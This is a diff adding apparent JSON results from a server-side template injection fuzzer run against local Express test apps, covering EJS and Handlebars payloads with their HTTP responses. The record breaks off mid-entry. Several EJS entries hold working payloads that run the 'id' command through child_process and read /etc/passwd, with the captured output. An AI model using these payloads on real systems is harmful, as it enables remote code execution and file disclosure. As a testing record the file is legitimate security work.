@@ -1,0 +1,1224 @@
+{
+  "metadata": {
+    "phase": "2.4",
+    "name": "SSTI Fuzzer",
+    "timestamp": "2026-02-15T12:33:54.308915",
+    "scope": "Express template engine integration"
+  },
+  "tests": [
+    {
+      "id": 1,
+      "test": "ejs_math",
+      "version": "v5",
+      "data": {
+        "template": "<%= 7*7 %>",
+        "status": 200,
+        "body": "49",
+        "indicator_found": true
+      }
+    },
+    {
+      "id": 2,
+      "test": "ejs_string_concat",
+      "version": "v5",
+      "data": {
+        "template": "<%= \"hello\" + \"world\" %>",
+        "status": 200,
+        "body": "helloworld",
+        "indicator_found": true
+      }
+    },
+    {
+      "id": 3,
+      "test": "ejs_process_env",
+      "version": "v5",
+      "data": {
+        "template": "<%= process.env.PATH %>",
+        "status": 200,
+        "body": "/home/[REDACTED]/.local/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/[REDACTED]/.dotnet/tools",
+        "indicator_found": true
+      }
+    },
+    {
+      "id": 4,
+      "test": "ejs_process_version",
+      "version": "v5",
+      "data": {
+        "template": "<%= process.version %>",
+        "status": 200,
+        "body": "v22.22.0",
+        "indicator_found": true
+      }
+    },
+    {
+      "id": 5,
+      "test": "ejs_global_process",
+      "version": "v5",
+      "data": {
+        "template": "<%= global.process.version %>",
+        "status": 200,
+        "body": "v22.22.0",
+        "indicator_found": true
+      }
+    },
+    {
+      "id": 6,
+      "test": "ejs_require_os",
+      "version": "v5",
+      "data": {
+        "template": "<%= process.mainModule.require(\"os\").hostname() %>",
+        "status": 200,
+        "body": "ansible",
+        "indicator_found": false
+      }
+    },
+    {
+      "id": 7,
+      "test": "ejs_require_child_process",
+      "version": "v5",
+      "data": {
+        "template": "<%= process.mainModule.require(\"child_process\").execSync(\"id\").toString() %>",
+        "status": 200,
+        "body": "uid=1000(svc) gid=1000(svc) groups=1000(svc),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),116(bluetooth),121(lpadmin),124(wireshark),132(vboxsf),133(kaboxer),984(docker)\n",
+        "indicator_found": true
+      }
+    },
+    {
+      "id": 8,
+      "test": "ejs_require_fs_read",
+      "version": "v5",
+      "data": {
+        "template": "<%= process.mainModule.require(\"fs\").readFileSync(\"/etc/passwd\").toString() %>",
+        "status": 200,
+        "body": "root:x:0:0:root:/root:/usr/bin/zsh\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/",
+        "indicator_found": true
+      }
+    },
+    {
+      "id": 9,
+      "test": "ejs_include_etc_passwd",
+      "version": "v5",
+      "data": {
+        "template": "<%- include(\"/etc/passwd\") %>",
+        "status": 500,
+        "body": "{\"error\":\"dynamic.ejs:1\\n >> 1| <%- include(\\\"/etc/passwd\\\") %>\\n\\nENOENT: no such file or directory, open '/etc/passwd.ejs'\",\"template\":\"<%- include(\\\"/etc/passwd\\\") %>\"}",
+        "indicator_found": false
+      }
+    },
+    {
+      "id": 10,
+      "test": "ejs_constructor_rce",
+      "version": "v5",
+      "data": {
+        "template": "<%= this.constructor.constructor(\"return process.mainModule.require('child_process').execSync('id').toString()\")() %>",
+        "status": 200,
+        "body": "uid=1000(svc) gid=1000(svc) groups=1000(svc),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),116(bluetooth),121(lpadmin),124(wireshark),132(vboxsf),133(kaboxer),984(docker)\n",
+        "indicator_found": true
+      }
+    },
+    {
+      "id": 11,
+      "test": "ejs_escaped_tag",
+      "version": "v5",
+      "data": {
+        "template": "&lt;%= 7*7 %&gt;",
+        "status": 200,
+        "body": "&lt;%= 7*7 %&gt;",
+        "indicator_found": false
+      }
+    },
+    {
+      "id": 12,
+      "test": "ejs_nested_tags",
+      "version": "v5",
+      "data": {
+        "template": "<%= \"<%= 7*7 %>\" %>",
+        "status": 500,
+        "body": "{\"error\":\"Could not find matching close tag for \\\"<%=\\\".\",\"template\":\"<%= \\\"<%= 7*7 %>\\\" %>\"}",
+        "indicator_found": false
+      }
+    },
+    {
+      "id": 13,
+      "test": "ejs_comment_injection",
+      "version": "v5",
+      "data": {
+        "template": "<%# comment %><%= 7*7 %>",
+        "status": 200,
+        "body": "49",
+        "indicator_found": true
+      }
+    },
+    {
+      "id": 14,
+      "test": "ejs_raw_output",
+      "version": "v5",
+      "data": {
+        "template": "<%- \"<script>alert(1)</script>\" %>",
+        "status": 200,
+        "body": "<script>alert(1)</script>",
+        "indicator_found": true
+      }
+    },
+    {
+      "id": 15,
+      "test": "ejs_multiline",
+      "version": "v5",
+      "data": {
+        "template": "<% var x = 7; %><%= x * x %>",
+        "status": 200,
+        "body": "49",
+        "indicator_found": true
+      }
+    },
+    {
+      "id": 16,
+      "test": "ejs_safe_xss_in_name",
+      "version": "v5",
+      "data": {
+        "value": "<script>alert(1)</script>",
+        "status": 200,
+        "body": "Hello, &lt;script&gt;alert(1)&lt;/script&gt;!",
+        "indicator_found": true
+      }
+    },
+    {
+      "id": 17,
+      "test": "ejs_safe_ejs_in_name",
+      "version": "v5",
+      "data": {
+        "value": "<%= 7*7 %>",
+        "status": 200,
+        "body": "Hello, &lt;%= 7*7 %&gt;!",
+        "indicator_found": false
+      }
+    },
+    {
+      "id": 18,
+      "test": "ejs_safe_template_literal",
+      "version": "v5",
+      "data": {
+        "value": "${7*7}",
+        "status": 200,
+        "body": "Hello, ${7*7}!",
+        "indicator_found": false
+      }
+    },
+    {
+      "id": 19,
+      "test": "ejs_math",
+      "version": "v4",
+      "data": {
+        "template": "<%= 7*7 %>",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at",
+        "indicator_found": false
+      }
+    },
+    {
+      "id": 20,
+      "test": "ejs_string_concat",
+      "version": "v4",
+      "data": {
+        "template": "<%= \"hello\" + \"world\" %>",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at",
+        "indicator_found": false
+      }
+    },
+    {
+      "id": 21,
+      "test": "ejs_process_env",
+      "version": "v4",
+      "data": {
+        "template": "<%= process.env.PATH %>",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at",
+        "indicator_found": true
+      }
+    },
+    {
+      "id": 22,
+      "test": "ejs_process_version",
+      "version": "v4",
+      "data": {
+        "template": "<%= process.version %>",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at",
+        "indicator_found": true
+      }
+    },
+    {
+      "id": 23,
+      "test": "ejs_global_process",
+      "version": "v4",
+      "data": {
+        "template": "<%= global.process.version %>",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at",
+        "indicator_found": true
+      }
+    },
+    {
+      "id": 24,
+      "test": "ejs_require_os",
+      "version": "v4",
+      "data": {
+        "template": "<%= process.mainModule.require(\"os\").hostname() %>",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at",
+        "indicator_found": false
+      }
+    },
+    {
+      "id": 25,
+      "test": "ejs_require_child_process",
+      "version": "v4",
+      "data": {
+        "template": "<%= process.mainModule.require(\"child_process\").execSync(\"id\").toString() %>",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at",
+        "indicator_found": false
+      }
+    },
+    {
+      "id": 26,
+      "test": "ejs_require_fs_read",
+      "version": "v4",
+      "data": {
+        "template": "<%= process.mainModule.require(\"fs\").readFileSync(\"/etc/passwd\").toString() %>",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at",
+        "indicator_found": false
+      }
+    },
+    {
+      "id": 27,
+      "test": "ejs_include_etc_passwd",
+      "version": "v4",
+      "data": {
+        "template": "<%- include(\"/etc/passwd\") %>",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at",
+        "indicator_found": false
+      }
+    },
+    {
+      "id": 28,
+      "test": "ejs_constructor_rce",
+      "version": "v4",
+      "data": {
+        "template": "<%= this.constructor.constructor(\"return process.mainModule.require('child_process').execSync('id').toString()\")() %>",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at",
+        "indicator_found": false
+      }
+    },
+    {
+      "id": 29,
+      "test": "ejs_escaped_tag",
+      "version": "v4",
+      "data": {
+        "template": "&lt;%= 7*7 %&gt;",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at",
+        "indicator_found": false
+      }
+    },
+    {
+      "id": 30,
+      "test": "ejs_nested_tags",
+      "version": "v4",
+      "data": {
+        "template": "<%= \"<%= 7*7 %>\" %>",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at",
+        "indicator_found": false
+      }
+    },
+    {
+      "id": 31,
+      "test": "ejs_comment_injection",
+      "version": "v4",
+      "data": {
+        "template": "<%# comment %><%= 7*7 %>",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at",
+        "indicator_found": false
+      }
+    },
+    {
+      "id": 32,
+      "test": "ejs_raw_output",
+      "version": "v4",
+      "data": {
+        "template": "<%- \"<script>alert(1)</script>\" %>",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at",
+        "indicator_found": false
+      }
+    },
+    {
+      "id": 33,
+      "test": "ejs_multiline",
+      "version": "v4",
+      "data": {
+        "template": "<% var x = 7; %><%= x * x %>",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at",
+        "indicator_found": false
+      }
+    },
+    {
+      "id": 34,
+      "test": "ejs_safe_xss_in_name",
+      "version": "v4",
+      "data": {
+        "value": "<script>alert(1)</script>",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/test",
+        "indicator_found": false
+      }
+    },
+    {
+      "id": 35,
+      "test": "ejs_safe_ejs_in_name",
+      "version": "v4",
+      "data": {
+        "value": "<%= 7*7 %>",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/test",
+        "indicator_found": false
+      }
+    },
+    {
+      "id": 36,
+      "test": "ejs_safe_template_literal",
+      "version": "v4",
+      "data": {
+        "value": "${7*7}",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/test",
+        "indicator_found": false
+      }
+    },
+    {
+      "id": 37,
+      "test": "hbs_basic",
+      "version": "v5",
+      "data": {
+        "template": "{{name}}",
+        "status": 200,
+        "body": "&lt;b&gt;test&lt;/b&gt;"
+      }
+    },
+    {
+      "id": 38,
+      "test": "hbs_math",
+      "version": "v5",
+      "data": {
+        "template": "{{7*7}}",
+        "status": 500,
+        "body": "{\"error\":\"Parse error on line 1:\\n{{7*7}}\\n--^\\nExpecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID'\",\"template\":\"{{7*7}}\"}"
+      }
+    },
+    {
+      "id": 39,
+      "test": "hbs_triple_stache",
+      "version": "v5",
+      "data": {
+        "template": "{{{name}}}",
+        "status": 200,
+        "body": "<b>test</b>"
+      }
+    },
+    {
+      "id": 40,
+      "test": "hbs_helper_lookup",
+      "version": "v5",
+      "data": {
+        "template": "{{lookup this \"constructor\"}}",
+        "status": 200,
+        "body": ""
+      }
+    },
+    {
+      "id": 41,
+      "test": "hbs_with_block",
+      "version": "v5",
+      "data": {
+        "template": "{{#with \"s\" as |string|}}{{string}}{{/with}}",
+        "status": 200,
+        "body": "s"
+      }
+    },
+    {
+      "id": 42,
+      "test": "hbs_each_block",
+      "version": "v5",
+      "data": {
+        "template": "{{#each this}}{{@key}}:{{this}} {{/each}}",
+        "status": 200,
+        "body": "name:&lt;b&gt;test&lt;/b&gt; "
+      }
+    },
+    {
+      "id": 43,
+      "test": "hbs_prototype_access",
+      "version": "v5",
+      "data": {
+        "template": "{{this.__proto__}}",
+        "status": 200,
+        "body": ""
+      }
+    },
+    {
+      "id": 44,
+      "test": "hbs_constructor_access",
+      "version": "v5",
+      "data": {
+        "template": "{{this.constructor}}",
+        "status": 200,
+        "body": ""
+      }
+    },
+    {
+      "id": 45,
+      "test": "hbs_rce_attempt",
+      "version": "v5",
+      "data": {
+        "template": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"r",
+        "status": 200,
+        "body": ""
+      }
+    },
+    {
+      "id": 46,
+      "test": "hbs_partial_injection",
+      "version": "v5",
+      "data": {
+        "template": "{{> (lookup . \"constructor\") }}",
+        "status": 500,
+        "body": "{\"error\":\"The partial undefined could not be found\",\"template\":\"{{> (lookup . \\\"constructor\\\") }}\"}"
+      }
+    },
+    {
+      "id": 47,
+      "test": "hbs_basic",
+      "version": "v4",
+      "data": {
+        "template": "{{name}}",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at"
+      }
+    },
+    {
+      "id": 48,
+      "test": "hbs_math",
+      "version": "v4",
+      "data": {
+        "template": "{{7*7}}",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at"
+      }
+    },
+    {
+      "id": 49,
+      "test": "hbs_triple_stache",
+      "version": "v4",
+      "data": {
+        "template": "{{{name}}}",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at"
+      }
+    },
+    {
+      "id": 50,
+      "test": "hbs_helper_lookup",
+      "version": "v4",
+      "data": {
+        "template": "{{lookup this \"constructor\"}}",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at"
+      }
+    },
+    {
+      "id": 51,
+      "test": "hbs_with_block",
+      "version": "v4",
+      "data": {
+        "template": "{{#with \"s\" as |string|}}{{string}}{{/with}}",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at"
+      }
+    },
+    {
+      "id": 52,
+      "test": "hbs_each_block",
+      "version": "v4",
+      "data": {
+        "template": "{{#each this}}{{@key}}:{{this}} {{/each}}",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at"
+      }
+    },
+    {
+      "id": 53,
+      "test": "hbs_prototype_access",
+      "version": "v4",
+      "data": {
+        "template": "{{this.__proto__}}",
+        "status": 500,
+        "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at"
+      }
+    },
+    {
+      "id": 54,
+      "test": "hbs_constructor_access",
+      "version": "v4",
+      "data": {
+        "template": "{{this.constructor}}",
+        "status": 500,
